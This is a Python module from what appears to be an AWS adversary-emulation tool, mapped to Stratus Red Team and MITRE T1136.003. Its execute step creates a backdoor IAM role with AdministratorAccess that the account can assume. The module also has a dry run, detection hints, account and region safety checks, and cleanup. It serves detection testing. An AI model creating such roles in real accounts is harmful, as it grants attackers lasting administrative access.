"""IAM Create Backdoor Role Module.

Simulate persistence via new backdoor IAM role creation.
Creates AttackLabBackdoorRole with AdministratorAccess and a trust policy
allowing the current account to assume it.
Maps to Stratus Red Team aws.persistence.iam-create-backdoor-role.
"""

import json
import logging

import botocore.exceptions

from joshuas_chaos.core.aws_context import AWSContext
from joshuas_chaos.core.config import AppConfig
from joshuas_chaos.core.models import ModuleResult
from joshuas_chaos.core.safety import SafetyChecker
from joshuas_chaos.modules import ChaosModule

logger = logging.getLogger("joshuas_chaos")

_ROLE_NAME = "AttackLabBackdoorRole"
_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"


class IAMCreateBackdoorRoleModule(ChaosModule):
    name = "iam_create_backdoor_role"
    description = (
        "Simulate persistence via new backdoor IAM role creation. Creates AttackLabBackdoorRole "
        "with AdministratorAccess and a trust policy allowing the current account to assume it. "
        "Maps to Stratus Red Team aws.persistence.iam-create-backdoor-role."
    )
    category = "persistence"
    required_permissions = [
        "iam:CreateRole",
        "iam:AttachRolePolicy",
        "iam:DetachRolePolicy",
        "iam:DeleteRole",
        "iam:TagRole",
    ]
    cloudtrail_events = ["CreateRole", "AttachRolePolicy", "DetachRolePolicy", "DeleteRole"]
    mitre_attack = ["T1136.003"]
    destructive = False
    reversible = True

    def check_prereqs(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        identity = context.get_caller_identity()
        return ModuleResult(
            module=self.name,
            mode="check_prereqs",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary="Check permissions to create backdoor IAM role.",
            required_permissions=self.required_permissions,
            observed_permissions=[],
            aws_api_calls=[],
            cloudtrail_events=self.cloudtrail_events,
            findings=["Run dry-run to assess iam:CreateRole + AdministratorAccess risk."],
            detections=[],
            cleanup_required=False,
            safe_to_execute=True,
        )

    def dry_run(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        """Check iam:CreateRole + iam:AttachRolePolicy permissions."""
        from joshuas_chaos.core.permissions import PermissionChecker

        identity = context.get_caller_identity()
        checker = PermissionChecker(context)
        findings: list[str] = []

        perm_results = checker.simulate_permissions(
            principal_arn=identity.arn,
            actions=["iam:CreateRole", "iam:AttachRolePolicy"],
        )

        simulation_available = any(v is not None for v in perm_results.values())
        if not simulation_available:
            findings.append(
                "[UNKNOWN] iam:SimulatePrincipalPolicy unavailable — "
                "permission state cannot be determined. Treat as potential risk."
            )

        if perm_results.get("iam:CreateRole") is True:
            findings.append("[RISK] Principal can call iam:CreateRole.")
        elif simulation_available:
            findings.append("iam:CreateRole not permitted for this principal.")

        if perm_results.get("iam:AttachRolePolicy") is True:
            findings.append("[RISK] Principal can call iam:AttachRolePolicy.")
        elif simulation_available:
            findings.append("iam:AttachRolePolicy not permitted for this principal.")

        findings.append(
            f"[DRY-RUN] Would create IAM role '{_ROLE_NAME}' with AdministratorAccess and cross-account trust."
        )

        detections = [
            "CloudTrail: iam:CreateRole + iam:AttachRolePolicy with AdministratorAccess",
            "GuardDuty: Persistence:IAMUser/UserPermissions",
            "AWS Config: iam-no-inline-policy-check",
        ]

        return ModuleResult(
            module=self.name,
            mode="dry-run",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary="Assessed backdoor role creation risk. No changes made.",
            required_permissions=self.required_permissions,
            observed_permissions=[p for p, v in perm_results.items() if v is True],
            aws_api_calls=["iam:SimulatePrincipalPolicy"],
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=detections,
            cleanup_required=False,
            safe_to_execute=True,
        )

    def execute(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        """Create AttackLabBackdoorRole with AdministratorAccess."""
        identity = context.get_caller_identity()
        checker = SafetyChecker(config, identity)
        checker.assert_account_allowed()
        checker.assert_region_allowed(context.region)
        checker.assert_resource_safe(_ROLE_NAME, {})

        iam = context.get_client("iam")
        findings: list[str] = []
        errors: list[str] = []
        api_calls: list[str] = []

        trust_policy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {"AWS": f"arn:aws:iam::{identity.account_id}:root"},
                    "Action": "sts:AssumeRole",
                }
            ],
        }

        # Create role
        try:
            iam.create_role(
                RoleName=_ROLE_NAME,
                AssumeRolePolicyDocument=json.dumps(trust_policy),
                Tags=[{"Key": "AttackLab", "Value": "true"}],
                Description="AttackLab backdoor role test",
            )
            api_calls.append(f"iam:CreateRole ({_ROLE_NAME})")
            findings.append(f"[EXECUTE] Created IAM role '{_ROLE_NAME}' with cross-account trust policy.")
        except botocore.exceptions.ClientError as exc:
            code = exc.response.get("Error", {}).get("Code", "Unknown")
            if code == "EntityAlreadyExists":
                findings.append(f"IAM role '{_ROLE_NAME}' already exists — idempotent.")
                api_calls.append(f"iam:CreateRole ({_ROLE_NAME}) [already existed]")
            else:
                errors.append(f"iam:CreateRole failed: {code}")

        # Attach AdministratorAccess
        try:
            iam.attach_role_policy(
                RoleName=_ROLE_NAME,
                PolicyArn=_POLICY_ARN,
            )
            api_calls.append(f"iam:AttachRolePolicy ({_ROLE_NAME}, AdministratorAccess)")
            findings.append(
                f"[EXECUTE] Attached AdministratorAccess policy to role '{_ROLE_NAME}'."
            )
        except botocore.exceptions.ClientError as exc:
            code = exc.response.get("Error", {}).get("Code", "Unknown")
            errors.append(f"iam:AttachRolePolicy failed: {code}")

        detections = [
            "CloudTrail: iam:CreateRole + iam:AttachRolePolicy with AdministratorAccess",
            "GuardDuty: Persistence:IAMUser/UserPermissions",
            "AWS Config: iam-no-inline-policy-check",
        ]

        return ModuleResult(
            module=self.name,
            mode="execute",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary=f"Created backdoor IAM role '{_ROLE_NAME}' with AdministratorAccess.",
            required_permissions=self.required_permissions,
            observed_permissions=["iam:CreateRole", "iam:AttachRolePolicy"],
            aws_api_calls=api_calls,
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=detections,
            cleanup_required=True,
            safe_to_execute=True,
            errors=errors,
        )

    def cleanup(self, context: AWSContext, config: AppConfig) -> ModuleResult:
        """Detach policy and delete AttackLabBackdoorRole. Idempotent."""
        identity = context.get_caller_identity()
        checker = SafetyChecker(config, identity)
        checker.assert_account_allowed()
        checker.assert_region_allowed(context.region)

        iam = context.get_client("iam")
        findings: list[str] = []
        errors: list[str] = []
        api_calls: list[str] = []

        # Detach policy
        try:
            iam.detach_role_policy(
                RoleName=_ROLE_NAME,
                PolicyArn=_POLICY_ARN,
            )
            api_calls.append(f"iam:DetachRolePolicy ({_ROLE_NAME})")
            findings.append(f"[CLEANUP] Detached AdministratorAccess from role '{_ROLE_NAME}'.")
        except botocore.exceptions.ClientError as exc:
            code = exc.response.get("Error", {}).get("Code", "Unknown")
            if code in ("NoSuchEntityException", "NoSuchEntity"):
                findings.append(
                    f"Policy not attached to '{_ROLE_NAME}' — idempotent."
                )
            else:
                errors.append(f"iam:DetachRolePolicy failed: {code}")

        # Delete role
        try:
            iam.delete_role(RoleName=_ROLE_NAME)
            api_calls.append(f"iam:DeleteRole ({_ROLE_NAME})")
            findings.append(f"[CLEANUP] Deleted IAM role '{_ROLE_NAME}'.")
        except botocore.exceptions.ClientError as exc:
            code = exc.response.get("Error", {}).get("Code", "Unknown")
            if code in ("NoSuchEntityException", "NoSuchEntity"):
                findings.append(f"IAM role '{_ROLE_NAME}' not found — idempotent.")
            else:
                errors.append(f"iam:DeleteRole failed: {code}")

        return ModuleResult(
            module=self.name,
            mode="cleanup",
            account_id=identity.account_id,
            principal_arn=identity.arn,
            region=context.region,
            risk_summary=f"Backdoor role '{_ROLE_NAME}' cleanup complete.",
            required_permissions=["iam:DetachRolePolicy", "iam:DeleteRole"],
            observed_permissions=[],
            aws_api_calls=api_calls,
            cloudtrail_events=self.cloudtrail_events,
            findings=findings,
            detections=[],
            cleanup_required=False,
            safe_to_execute=True,
            errors=errors,
        )


MODULE = IAMCreateBackdoorRoleModule()
